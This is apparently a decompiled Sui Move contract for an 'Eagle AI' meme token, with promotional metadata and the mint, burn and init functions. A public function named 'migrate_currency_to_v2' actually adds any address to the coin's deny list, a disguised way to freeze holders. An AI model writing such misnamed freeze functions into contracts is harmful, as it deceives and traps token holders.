module 0xb6ef1341151e9d0cbbc21dabab98260b3f2cc1a8c033e7d0507656328ee0ee38::eai {
    struct EAI has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<EAI>, arg1: 0x2::coin::Coin<EAI>) {
        0x2::coin::burn<EAI>(arg0, arg1);
    }

    fun init(arg0: EAI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<EAI>(arg0, 9, b"EAI", b"Eagle AI", b"Eagle AI is a cutting-edge platform designed to democratize advanced digital asset analysis. By leveraging institutional-grade data feeds and state-of-the-art AI technology, Eagle AI provides unparalleled insights and predictive analytics for digital assets. Users can access real-time data, trend analysis, and market predictions through a user-friendly Telegram bot interface. The platform caters to both novice and experienced traders, ensuring everyone can make informed decisions with ease. Eagle AI's commitment to transparency, security, and innovation makes it a trusted tool in the digital asset space.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.postimg.cc/bJBNBYPS/0x6797b6244fa75f2e78cdffc3a4eb169332b730cc.webp")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<EAI>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<EAI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<EAI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<EAI>>(v1, @0x91172ddb529a99b35250e8176a26663b04dc371e224312fea49e4465fc820e36);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<EAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<EAI>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<EAI>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<EAI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

